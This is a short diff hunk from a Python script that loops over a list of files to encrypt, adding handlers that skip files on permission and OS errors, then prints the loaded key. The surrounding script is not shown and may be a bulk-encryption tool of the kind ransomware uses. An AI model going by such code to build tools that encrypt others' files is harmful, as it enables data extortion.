@@ -85,7 +85,9 @@ for file in files_to_encrypt:
     except FileNotFoundError:
         continue
     except PermissionError:
-        pass
+        continue
+    except OSError:
+        continue
 
 print(f'KEY: {loaded_key}')
 
